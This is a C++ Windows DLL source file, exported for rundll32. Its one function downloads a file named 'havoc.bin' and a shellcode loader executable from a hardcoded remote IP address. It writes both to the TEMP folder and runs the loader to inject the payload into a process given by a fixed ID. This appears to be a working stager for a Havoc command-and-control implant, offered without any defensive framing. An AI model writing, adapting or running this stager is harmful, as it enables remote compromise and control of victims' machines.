#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")

BOOL DownloadAndRunHavoc()
{
    HINTERNET hInternet = InternetOpen(L"MyUserAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        MessageBoxA(NULL, "Failed to initialize internet connection.", "Error", MB_ICONERROR);
        return FALSE;
    }

    // Download havoc.bin
    LPCWSTR binUrl = L"http://185.124.175.186:2020/havoc.bin";
    HINTERNET hBinConnect = InternetOpenUrl(hInternet, binUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hBinConnect) {
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to download havoc.bin.", "Error", MB_ICONERROR);
        return FALSE;
    }

    WCHAR tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        InternetCloseHandle(hBinConnect);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to get temp directory.", "Error", MB_ICONERROR);
        return FALSE;
    }

    WCHAR binFilePath[MAX_PATH];
    if (!PathCombineW(binFilePath, tempPath, L"havoc.bin")) {
        InternetCloseHandle(hBinConnect);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to set file path for havoc.bin.", "Error", MB_ICONERROR);
        return FALSE;
    }

    std::ofstream binOutFile(binFilePath, std::ios::binary);
    if (!binOutFile) {
        InternetCloseHandle(hBinConnect);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to create havoc.bin file.", "Error", MB_ICONERROR);
        return FALSE;
    }

    char buffer[1024];
    DWORD bytesRead;
    BOOL success = TRUE;

    while (InternetReadFile(hBinConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        binOutFile.write(buffer, bytesRead);
        if (!binOutFile) {
            success = FALSE;
            break;
        }
    }

    binOutFile.close();
    InternetCloseHandle(hBinConnect);

    if (!success) {
        DeleteFileW(binFilePath);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to write havoc.bin data.", "Error", MB_ICONERROR);
        return FALSE;
    }

    // Download havocshellcodeloader.exe
    LPCWSTR exeUrl = L"http://185.124.175.186:2020/havocshellcodeloader.exe";
    HINTERNET hExeConnect = InternetOpenUrl(hInternet, exeUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hExeConnect) {
        DeleteFileW(binFilePath);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to download havocshellcodeloader.exe.", "Error", MB_ICONERROR);
        return FALSE;
    }

    WCHAR exeFilePath[MAX_PATH];
    if (!PathCombineW(exeFilePath, tempPath, L"havocshellcodeloader.exe")) {
        DeleteFileW(binFilePath);
        InternetCloseHandle(hExeConnect);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to set file path for havocshellcodeloader.exe.", "Error", MB_ICONERROR);
        return FALSE;
    }

    std::ofstream exeOutFile(exeFilePath, std::ios::binary);
    if (!exeOutFile) {
        DeleteFileW(binFilePath);
        InternetCloseHandle(hExeConnect);
        InternetCloseHandle(hInternet);
        MessageBoxA(NULL, "Failed to create havocshellcodeloader.exe file.", "Error", MB_ICONERROR);
        return FALSE;
    }

    while (InternetReadFile(hExeConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        exeOutFile.write(buffer, bytesRead);
        if (!exeOutFile) {
            success = FALSE;
            break;
        }
    }

    exeOutFile.close();
    InternetCloseHandle(hExeConnect);
    InternetCloseHandle(hInternet);

    if (!success) {
        DeleteFileW(binFilePath);
        DeleteFileW(exeFilePath);
        MessageBoxA(NULL, "Failed to write havocshellcodeloader.exe data.", "Error", MB_ICONERROR);
        return FALSE;
    }

    // Set working directory to TEMP (where the files are)
    SetCurrentDirectoryW(tempPath);

    // Construct the command line: "havocshellcodeloader.exe 13932 .\havoc.bin"
    WCHAR commandLine[MAX_PATH * 2];
    wsprintfW(commandLine, L"\"%s\" 13932 .\\havoc.bin", exeFilePath);

    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"open";
    sei.lpFile = exeFilePath;
    sei.lpParameters = L"13932 .\\havoc.bin";  // Directly pass the arguments
    sei.lpDirectory = tempPath;  // Run from TEMP directory
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteEx(&sei)) {
        DeleteFileW(binFilePath);
        DeleteFileW(exeFilePath);
        MessageBoxA(NULL, "Failed to execute: havocshellcodeloader.exe 13932 .\\havoc.bin", "Error", MB_ICONERROR);
        return FALSE;
    }

    // Success message
    MessageBoxA(NULL, "Successfully executed: havocshellcodeloader.exe 13932 .\\havoc.bin", "Success", MB_ICONINFORMATION);
    return TRUE;
}

// Export a simple function that rundll32 can call
extern "C" __declspec(dllexport) void RunDownload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    DownloadAndRunHavoc();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    return TRUE;
}
